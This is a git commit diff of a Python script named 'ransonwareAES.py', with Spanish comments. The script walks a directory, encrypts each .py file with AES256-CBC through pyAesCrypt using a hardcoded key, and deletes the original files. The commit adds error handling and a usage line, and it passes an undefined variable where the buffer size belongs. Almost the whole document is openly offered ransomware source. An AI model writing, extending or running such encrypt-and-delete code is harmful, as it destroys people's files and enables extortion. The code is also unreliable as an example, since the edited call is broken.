cf5d775a6650c8b6e3c9c011f8b86e692f006e94
alvarezmarco <alvarez_marco@hotmail.com>
2019-02-16 17:23:07 +0100

    Add files via upload

--- ransonwareAES.py
+++ ransonwareAES.py
@@ -4,8 +4,9 @@
 #Reconocimiento-NoComercial-CompartirtIgual
 #Se puede distribuir y/o modificar siempre y cuando no sean con fines comerciales.
 
-#Script que cifra archivos .py que se encuentran en una ruta, una vez cifrados se procede a borrar 
+#Script que cifra con AES256-CBC archivos .py que se encuentran en una ruta, una vez cifrados se procede a borrar 
 #los archivos originales.
+#use: python3 ransonwareAES.py
 
 
 
@@ -19,38 +20,49 @@ clave = "test"
 class ransonware:
     
     def _init_(self):
-        print("Public and Private Key RSA 2048")    
+        print("Ransonware AES256-CBC")    
 
     def cifrar(self, clave, file, fileout=None):
-        buffer=64*1024
-        
-        if not fileout:
-            fileout=file+'.encrypt'
-        size = os.path.getsize(file)
+        try:
+            buffer=64*1024
+            if not fileout:
+                fileout=file+'.encrypt'
+            size = os.path.getsize(file)
     
-        with open(file, 'rb') as ifile:   
-            with open(fileout,'wb') as ofile:
-                print ("Encrypting",file)
-                cifrando= pyAesCrypt.encryptStream(ifile, ofile, clave, buffer)
-                print ("Encrypted successfull")
-                print ("Deleting",file)
+            with open(file, 'rb') as ifile:   
+                with open(fileout,'wb') as ofile:
+                    print ("Encrypting",file)
+                    cifrando= pyAesCrypt.encryptStream(ifile, ofile, clave, psw)
+                    print ("Encrypted successfull")
+                    print ("Deleting",file)
+        except Exception as e:
+            print (e)
+            
                 
 
     
     
     def malware_infect(self):
-        for root , dirName, fileList in os.walk(path):
-            #  print('Found directory: %s' % dirName)
-            for fname in fileList:
-                print('Se va a cifrar: \t%s' % fname)
-                if fname.endswith('.py'):
-                    self.cifrar(clave,os.path.join(root,fname))
-                    os.remove(os.path.join(root, fname)) 
-                    print('Deleted file successful: \t%s' % fname)
 
+        try:
+                for root , dirName, fileList in os.walk(path):
+                    for fname in fileList:
+                        print('Se va a cifrar: \t%s' % fname)
+                        if fname.endswith('.py'):
+                            self.cifrar(clave,os.path.join(root,fname))
+                            os.remove(os.path.join(root, fname)) 
+                            print('Deleted file successful: \t%s' % fname)
+
+        except Exception as e:
+            print (e)
+              
+
+
+    
 
 
 def main():
+    
     malware=ransonware()
     malware.malware_infect()
     
